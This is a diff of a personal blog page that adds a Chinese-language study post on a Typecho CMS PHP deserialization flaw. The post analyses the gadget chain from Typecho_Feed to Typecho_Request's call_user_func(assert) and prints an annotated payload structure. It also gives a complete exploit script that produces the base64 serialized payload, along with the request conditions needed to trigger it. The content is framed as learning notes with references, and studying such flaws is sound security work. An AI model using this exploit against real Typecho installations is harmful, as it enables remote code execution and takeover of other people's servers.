@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>阿杰的小站</title>
+    <title>Typecho反序列化小白笔记 · 阿杰的小站</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >阿杰的小站</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Typecho反序列化小白笔记</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>阿杰的小站</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            Typecho反序列化小白笔记
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">818</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/01</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,44 +399,58 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/03/31/文件包含漏洞/" >
-            
-                <span>文件包含漏洞小结</span>
-        </a>
-        <div class="abstract-content">
-            原理如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。常见函数有：include()、require()区别：
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>序列化内容：Array（Object）<br>反序列化<br>反序列化内容传入Typecho_Db的构造函数中<br>Typecho_Db构造函数将Object与字符串拼接触发<code>__toString</code>方法<br>搜寻<code>__toString</code>方法<br>在<code>Typecho_Feed</code>类中<code>__toString</code>方法第290行的私有变量调用了某个属性<code>$_items</code><br>该属性被遍历，其元素的<code>$item[&#39;author&#39;]</code>调用了某个属性<code>screenName</code><br>我们可以控制其访问不可访问属性来触发<code>__get</code>方法，因此将Object设置为<code>Typecho_feed</code><br>搜寻<code>__get</code>方法<br>找到<code>Typecho_Request</code>类，分析<code>__get</code>方法，<code>__get</code>方法调用了<code>get</code>方法<br><code>get</code>寻找<code>$_params</code>中键为<code>key</code>的值赋值为<code>value</code>，<code>key</code>值为<code>scrennName</code><br><code>get</code>方法调用<code>_applyFilter</code>方法，将<code>value</code>传递进去<br><code>_applyFilter</code>有危险方法<code>call_user_func</code>，并且两个参数可控，最后达成命令执行。<br>因此将<code>_itmes</code>的元素赋值为<code>Typecho_Request</code>，并且设置<code>default</code>为<code>phpinfo();</code>，设置<code>_filter</code>为<code>array(&#39;assert&#39;)</code></p>
+<h2 id="payload结构："><a href="#payload结构：" class="headerlink" title="payload结构："></a>payload结构：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">(  // 实例化一个Typecho_Db， 数组必须包含 &apos;adapter&apos;和&apos;prefix&apos;两个键值</span><br><span class="line"></span><br><span class="line">    /** </span><br><span class="line">     * 实例化Typecho_Db时构造函数中进行字符串拼接，</span><br><span class="line">     * 如果值为对象，则触发该对象的 __toString()魔术方法</span><br><span class="line">     */</span><br><span class="line">    [adapter] =&gt; Typecho_Feed Object  </span><br><span class="line">      (</span><br><span class="line">        /** </span><br><span class="line">         * 在Feed的__toString()魔术方法中，</span><br><span class="line">         * 290行和358行，访问了$item[&apos;author&apos;]-&gt;screenName</span><br><span class="line">         * 程序要运行到此处$this-&gt;_type必须为 &quot;RSS 2.0&quot;或者&quot;ATOM 1.0&quot;</span><br><span class="line">         */</span><br><span class="line">        [_type:Typecho_Feed:private] =&gt; RSS 2.0  </span><br><span class="line"></span><br><span class="line">        /** </span><br><span class="line">         * 当从不可访问的属性中读取，将会触发该类的__get()魔术方法</span><br><span class="line">         */</span><br><span class="line">        [_items:Typecho_Feed:private] =&gt; Array</span><br><span class="line">          (</span><br><span class="line">            [0] =&gt; Array</span><br><span class="line">              (</span><br><span class="line">                /** </span><br><span class="line">                 * &apos;category&apos; 用于分支处理，如果不用于回显数据，此字段可以省略</span><br><span class="line">                 *  此处需要构造非空数组，且成员值为对象</span><br><span class="line">                 */</span><br><span class="line">                [category] =&gt; Array</span><br><span class="line">                  (</span><br><span class="line">                    [0] =&gt; Test Object</span><br><span class="line">                      (</span><br><span class="line">                      )</span><br><span class="line">                  )</span><br><span class="line"></span><br><span class="line">                /** </span><br><span class="line">                 *  此处构造满足触发Typecho_Request对象的__get()魔术方法</span><br><span class="line">                 */</span><br><span class="line">                [author] =&gt; Typecho_Request Object</span><br><span class="line">                  (  // 必须包含两个键值 &apos;_params&apos;和&apos;_filter&apos;</span><br><span class="line"></span><br><span class="line">                    /** </span><br><span class="line">                     * @ 此处为触发的关键部分</span><br><span class="line">                     * 1、由Feed类中访问screName触发Request的__get()，</span><br><span class="line">                     *    在Request.php的290行传入$key=&apos;screenName&apos;</span><br><span class="line">                     * 2、此时get()函数内  $value=&apos;phpinfo()&apos;    // 296-297行</span><br><span class="line">                     * 3、继续判断了  $value值非数组，且长度大于0  // 307行</span><br><span class="line">                     * 4、将 $value 传入 _applyFilter()                </span><br><span class="line">                     * 5、判断 $this-&gt;_filter                    // 161行</span><br><span class="line">                     * 6、遍历 $this-&gt;_filter                    // 162行</span><br><span class="line">                     * 7、$value非数组，执行call_user_func($filter, $value)</span><br><span class="line">                     * 8、最终执行结果为call_user_func(assert, phpinfo())</span><br><span class="line">                     */</span><br><span class="line">                    [_params:Typecho_Request:private] =&gt; Array</span><br><span class="line">                      (</span><br><span class="line">                        [screenName] =&gt; phpinfo()</span><br><span class="line">                      )</span><br><span class="line"></span><br><span class="line">                    [_filter:Typecho_Request:private] =&gt; Array</span><br><span class="line">                      (</span><br><span class="line">                        [0] =&gt; assert</span><br><span class="line">                      )</span><br><span class="line">                  )</span><br><span class="line">              )</span><br><span class="line">          )</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">    // 分支处理</span><br><span class="line">    [prefix] =&gt; typecho_</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>没注释的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">    [adapter] =&gt; Typecho_Feed Object</span><br><span class="line">    (</span><br><span class="line">        [_type:Typecho_Feed:private] =&gt; RSS 2.0</span><br><span class="line">        [_items:Typecho_Feed:private] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; Array</span><br><span class="line">            (</span><br><span class="line">                [category] =&gt; Array</span><br><span class="line">                    (</span><br><span class="line">                        [0] =&gt; Test Object</span><br><span class="line">                            (</span><br><span class="line">                            )</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                [author] =&gt; Typecho_Request Object</span><br><span class="line">                (</span><br><span class="line">                    [_params:Typecho_Request:private] =&gt; Array</span><br><span class="line">                        (</span><br><span class="line">                            [screenName] =&gt; phpinfo()</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [_filter:Typecho_Request:private] =&gt; Array</span><br><span class="line">                        (</span><br><span class="line">                            [0] =&gt; assert</span><br><span class="line">                        )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    [prefix] =&gt; typecho_</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$CMD = &apos;phpinfo()&apos;;</span><br><span class="line"></span><br><span class="line">class Typecho_Feed &#123;</span><br><span class="line">	const RSS2 = &apos;RSS 2.0&apos;;</span><br><span class="line">	const ATOM1 = &apos;ATOM 1.0&apos;;</span><br><span class="line"></span><br><span class="line">	private $_type;</span><br><span class="line">	private $_items;</span><br><span class="line"></span><br><span class="line">	public function __construct() &#123;</span><br><span class="line">		//$this-&gt;_type = $this::RSS2;</span><br><span class="line"></span><br><span class="line">		$this-&gt;_type = $this::ATOM1;</span><br><span class="line">		$this-&gt;_items[0] = array(</span><br><span class="line">			&apos;category&apos; =&gt; array(new Typecho_Request()),</span><br><span class="line">			&apos;author&apos; =&gt; new Typecho_Request(),</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Request &#123;</span><br><span class="line">	private $_params = array();</span><br><span class="line">	private $_filter = array();</span><br><span class="line"></span><br><span class="line">	public function __construct() &#123;</span><br><span class="line">		$this-&gt;_params[&apos;screenName&apos;] = $GLOBALS[CMD];</span><br><span class="line">		$this-&gt;_filter[0] = &apos;assert&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = array(</span><br><span class="line">	&apos;adapter&apos; =&gt; new Typecho_Feed(),</span><br><span class="line">	&apos;prefix&apos; =&gt; &apos;typecho_&apos;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($exp));</span><br></pre></td></tr></table></figure>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>需要GET传参finish，并且Referer字段为本站。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://www.freebuf.com/vuls/155753.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/155753.html</a></li>
+<li><a href="https://skysec.top/2017/12/29/cms%E5%B0%8F%E7%99%BD%E5%AE%A1%E8%AE%A1-typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://skysec.top/2017/12/29/cms%E5%B0%8F%E7%99%BD%E5%AE%A1%E8%AE%A1-typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</a></li>
+<li><a href="https://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/#typecho%E5%BA%8F%E5%88%97%E5%8C%96" target="_blank" rel="noopener">https://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/#typecho%E5%BA%8F%E5%88%97%E5%8C%96</a></li>
+</ol>
 
-include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行
-require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行
-
-require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模板文件include_once()、require_once()与(include\require)的功能相同,只...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/31</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Kage</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/09/01/Typecho反序列化小白笔记/">http://yoursite.com/2019/09/01/Typecho反序列化小白笔记/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/09/01/Typecho反序列化小白笔记/">九月 1日 2019, 8:02:09 晚上</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/09/01/Typecho反序列化小白笔记/">September 1st 2019, 8:02:09 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/09/01/PHP反序列化原生类魔术方法的利用/" title= "PHP反序列化原生类魔术方法的利用">
+                    <div class="prevTitle">PHP反序列化原生类魔术方法的利用</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -457,6 +532,24 @@ require一般是用于文件头包含类文件、数据库等等文件，include
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload结构："><span class="toc-number">2.</span> <span class="toc-text">payload结构：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp："><span class="toc-number">3.</span> <span class="toc-text">exp：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注意"><span class="toc-number">4.</span> <span class="toc-text">注意</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1032,6 +1125,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
